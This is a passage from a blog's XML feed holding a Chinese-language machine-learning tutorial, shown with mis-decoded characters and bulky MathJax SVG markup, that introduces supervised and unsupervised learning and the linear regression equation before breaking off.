          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> å®‰å“é€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœºå™¨å­¦ä¹ ç¬”è®°</title>
      <link href="/2025/02/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="æœºå™¨å­¦ä¹ ">æœºå™¨å­¦ä¹ </h2><p>æœºå™¨å­¦ä¹ ï¼ˆMachine Learningï¼‰æ˜¯äººå·¥æ™ºèƒ½çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œç®€å•æ¥è¯´ï¼Œå®ƒè®©è®¡ç®—æœºé€šè¿‡æ•°æ®è‡ªå·±â€œå­¦ä¹ â€è§„å¾‹å¹¶åšå‡ºé¢„æµ‹æˆ–å†³ç­–ï¼Œè€Œä¸éœ€è¦äººç±»æ˜ç¡®åœ°ç¼–å†™æ¯ä¸€æ­¥è§„åˆ™ã€‚å®ƒæœ‰ç‚¹åƒæ•™å°å­©è®¤è¯†ä¸–ç•Œï¼šä½ ç»™å®ƒå¾ˆå¤šä¾‹å­ï¼Œå®ƒé€šè¿‡è§‚å¯Ÿå’Œæ€»ç»“æ‰¾å‡ºæ¨¡å¼ï¼Œä»¥åé‡åˆ°ç±»ä¼¼æƒ…å†µå°±èƒ½è‡ªå·±åˆ¤æ–­ã€‚</p><p>å…·ä½“ç‚¹ï¼Œæœºå™¨å­¦ä¹ çš„æ ¸å¿ƒæ˜¯ç”¨ç®—æ³•ä»æ•°æ®ä¸­æå–ç‰¹å¾ã€å»ºç«‹æ¨¡å‹ï¼Œç„¶åç”¨è¿™ä¸ªæ¨¡å‹å»è§£å†³å®é™…é—®é¢˜ã€‚æ¯”å¦‚ï¼Œä½ æƒ³è®©æœºå™¨è¯†åˆ«æ‰‹å†™æ•°å­—ï¼Œå¯ä»¥ç»™å®ƒçœ‹å‡ åƒå¼ å†™ç€0åˆ°9çš„å›¾ç‰‡ï¼Œå‘Šè¯‰å®ƒæ¯ä¸ªæ˜¯ä»€ä¹ˆï¼ˆæˆ–è€…ä¸å‘Šè¯‰ï¼Œè®©å®ƒè‡ªå·±åˆ†ç»„ï¼‰ï¼Œå®ƒå°±ä¼šæ…¢æ…¢å­¦ä¼šåˆ†è¾¨ã€‚</p><p>æœºå™¨å­¦ä¹ ä¸»è¦åˆ†ä¸‰ç§ç±»å‹ï¼š<strong>ç›‘ç£å­¦ä¹ </strong>ï¼ˆæœ‰æ ‡ç­¾æ•°æ®ï¼Œåƒæ•™ç­”æ¡ˆï¼‰ã€<strong>æ— ç›‘ç£å­¦ä¹ </strong>ï¼ˆæ— æ ‡ç­¾ï¼Œè‡ªå·±æ‰¾è§„å¾‹ï¼‰å’Œ<strong>å¼ºåŒ–å­¦ä¹ </strong>ï¼ˆé€šè¿‡è¯•é”™å­¦æ€ä¹ˆåšæœ€å¥½ï¼‰ã€‚</p><p>å®ƒåœ¨ç”Ÿæ´»ä¸­æ— å¤„ä¸åœ¨ï¼Œæ¯”å¦‚æ¨èä½ å–œæ¬¢çš„ç”µå½±ã€è¿‡æ»¤åƒåœ¾é‚®ä»¶ã€è‡ªåŠ¨é©¾é©¶è¯†åˆ«è·¯å†µï¼Œç”šè‡³å¸®åŒ»ç”Ÿçœ‹Xå…‰ç‰‡ã€‚å…³é”®åœ¨äºï¼Œå®ƒé çš„æ˜¯æ•°æ®å’Œç®—æ³•ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„â€œå¦‚æœè¿™æ ·å°±é‚£æ ·â€çš„ç¡¬ç¼–ç è§„åˆ™ã€‚æ‰€ä»¥æ•°æ®è¶Šå¤šã€ç®—æ³•è¶Šèªæ˜ï¼Œå®ƒå°±è¶Šå‰å®³ã€‚</p><h2 id="ç›‘ç£å­¦ä¹ å’Œæ— ç›‘ç£å­¦ä¹ ">ç›‘ç£å­¦ä¹ å’Œæ— ç›‘ç£å­¦ä¹ </h2><p>ç›‘ç£å­¦ä¹ å’Œæ— ç›‘ç£å­¦ä¹ æ˜¯ä¸¤ç§æœ€åŸºæœ¬çš„æ–¹æ³•ï¼Œå®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨äº<strong>æ•°æ®æ˜¯å¦å¸¦æœ‰æ ‡ç­¾</strong></p><h3 id="ç›‘ç£å­¦ä¹ ">ç›‘ç£å­¦ä¹ </h3><p>ç›‘ç£å­¦ä¹ ï¼ˆSupervised Learningï¼‰å°±åƒæœ‰ä¸€ä¸ªè€å¸ˆåœ¨æ—è¾¹æŒ‡å¯¼ã€‚å®ƒçš„æ ¸å¿ƒæ˜¯<strong>ç”¨å·²ç»æ ‡è®°å¥½çš„æ•°æ®æ¥è®­ç»ƒæ¨¡å‹</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>æ•°æ®é‡Œä¸ä»…æœ‰è¾“å…¥ï¼ˆç‰¹å¾ï¼‰ï¼Œè¿˜æœ‰å¯¹åº”çš„æ­£ç¡®è¾“å‡ºï¼ˆæ ‡ç­¾ï¼‰</strong>ã€‚æ¯”å¦‚ï¼Œä½ è¦æ•™æ¨¡å‹è¯†åˆ«çŒ«ç‹—çš„å›¾ç‰‡ï¼Œè®­ç»ƒæ•°æ®é‡Œæ¯å¼ å›¾ç‰‡éƒ½ä¼šæ ‡æ³¨â€œè¿™æ˜¯çŒ«â€æˆ–â€œè¿™æ˜¯ç‹—â€ã€‚æ¨¡å‹é€šè¿‡å­¦ä¹ è¿™äº›ä¾‹å­ï¼Œæ‰¾åˆ°è¾“å…¥å’Œè¾“å‡ºä¹‹é—´çš„è§„å¾‹ï¼Œä»¥åçœ‹åˆ°æ–°å›¾ç‰‡å°±èƒ½è‡ªå·±åˆ¤æ–­æ˜¯çŒ«è¿˜æ˜¯ç‹—ã€‚å¸¸è§çš„ç›‘ç£å­¦ä¹ ä»»åŠ¡åŒ…æ‹¬<strong>åˆ†ç±»()</strong>ï¼ˆæ¯”å¦‚åˆ¤æ–­é‚®ä»¶æ˜¯ä¸æ˜¯åƒåœ¾é‚®ä»¶ï¼‰å’Œ<strong>å›å½’()</strong>ï¼ˆæ¯”å¦‚é¢„æµ‹æˆ¿ä»·ï¼‰</p><h3 id="æ— ç›‘ç£å­¦ä¹ ">æ— ç›‘ç£å­¦ä¹ </h3><p>æ— ç›‘ç£å­¦ä¹ ï¼ˆUnsupervised Learningï¼‰åˆ™æ²¡æœ‰è¿™ä¸ªâ€œè€å¸ˆâ€ã€‚<strong>æ•°æ®åªæœ‰è¾“å…¥ï¼Œæ²¡æœ‰é¢„å…ˆç»™å‡ºçš„æ ‡ç­¾ï¼Œæ¨¡å‹å¾—è‡ªå·±å»æŒ–æ˜æ•°æ®çš„å†…åœ¨ç»“æ„æˆ–æ¨¡å¼</strong>ã€‚æ¯”å¦‚ï¼Œä½ ç»™ä¸€å †å›¾ç‰‡ï¼Œæ¨¡å‹å¯èƒ½ä¼šè‡ªå·±æŠŠå®ƒä»¬åˆ†æˆå‡ ç±»ï¼Œæ¯”å¦‚â€œçœ‹èµ·æ¥åƒåŠ¨ç‰©çš„â€å’Œâ€œçœ‹èµ·æ¥åƒé£æ™¯çš„â€ï¼Œä½†å®ƒä¸çŸ¥é“è¿™äº›ç±»å…·ä½“å«ä»€ä¹ˆã€‚æ— ç›‘ç£å­¦ä¹ å¸¸ç”¨æ¥åš<strong>èšç±»(Clustering)</strong>ï¼ˆæŠŠç›¸ä¼¼çš„ä¸œè¥¿åˆ†ä¸€ç»„ï¼‰ã€<strong>é™ç»´(Dimensionality reduction)</strong>ï¼ˆæŠŠå¤æ‚æ•°æ®ç®€åŒ–ä½†ä¿ç•™å…³é”®ä¿¡æ¯ï¼‰æˆ–è€…<strong>å¼‚å¸¸æ£€æµ‹(Anomaly detection)</strong>ï¼ˆå‘ç°å¼‚å¸¸çš„æ•°æ®ç‚¹ï¼‰ï¼Œæ¯”å¦‚åˆ†æç”¨æˆ·è¡Œä¸ºã€å‹ç¼©æ•°æ®å’Œé‡‘èç³»ç»Ÿä¸­çš„æ¬ºè¯ˆæ£€æµ‹ã€‚</p><h2 id="çº¿æ€§å›å½’æ¨¡å‹-Linear-Regression">çº¿æ€§å›å½’æ¨¡å‹(Linear Regression)</h2><p><strong>çº¿æ€§å›å½’</strong>æ˜¯ç›‘ç£å­¦ä¹ ä¸­æœ€åŸºç¡€çš„å›å½’æ¨¡å‹ï¼Œæ—¨åœ¨å»ºç«‹è¾“å…¥ç‰¹å¾ï¼ˆXï¼‰ä¸è¿ç»­å‹ç›®æ ‡å˜é‡ï¼ˆyï¼‰ä¹‹é—´çš„<strong>çº¿æ€§å…³ç³»</strong>ã€‚å…¶æ ¸å¿ƒå‡è®¾æ˜¯ï¼šç›®æ ‡å€¼å¯ä»¥é€šè¿‡ç‰¹å¾çš„<strong>åŠ æƒæ±‚å’Œ</strong>åŠ ä¸Šä¸€ä¸ªå¸¸æ•°é¡¹ï¼ˆæˆªè·ï¼‰æ¥é¢„æµ‹ã€‚</p><h3 id="æ¨¡å‹æ–¹ç¨‹">æ¨¡å‹æ–¹ç¨‹</h3><p><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="35.24ex" height="2.059ex" role="img" focusable="false" viewbox="0 -705 15576.2 910" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(1823.6,0)"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(2951.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3951.6,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(4857.1,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6087.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(7088.1,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(7993.7,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(9002.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(9780.2,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(10224.9,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(10669.5,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(11114.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(11892.2,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(12868.5,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(14170,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(15170.2,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>y</mi><mo>=</mo><msub><mi>Î¸</mi><mn>0</mn></msub><mo>+</mo><mrow data-mjx-texclass="ORD"><msub><mi>Î¸</mi><mn>1</mn></msub></mrow><mrow data-mjx-texclass="ORD"><msub><mi>x</mi><mn>1</mn></msub></mrow><mo>+</mo><mrow data-mjx-texclass="ORD"><msub><mi>Î¸</mi><mn>2</mn></msub></mrow><mrow data-mjx-texclass="ORD"><msub><mi>x</mi><mn>2</mn></msub></mrow><mo>+</mo><mo>.</mo><mo>.</mo><mo>.</mo><mo>+</mo><mrow data-mjx-texclass="ORD"><msub><mi>Î¸</mi><mi>n</mi></msub></mrow><mrow data-mjx-texclass="ORD"><msub><mi>x</mi><mi>n</mi></msub></mrow><mo>+</mo><mi>Ïµ</mi></math></mjx-assistive-mml></mjx-container></p><ul><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>y</mi></math></mjx-assistive-mml></mjx-container> ï¼šé¢„æµ‹ç›®æ ‡å€¼</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="2.049ex" height="1.97ex" role="img" focusable="false" viewbox="0 -705 905.6 870.6" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>Î¸</mi><mn>0</mn></msub></math></mjx-assistive-mml></mjx-container>ï¼šæˆªè·ï¼ˆbias termï¼‰</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="5.389ex" height="1.952ex" role="img" focusable="false" viewbox="0 -705 2381.8 862.8" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mtext" transform="translate(905.6,0)"><path data-c="7E" d="M179 251Q164 251 151 245T131 234T111 215L97 227L83 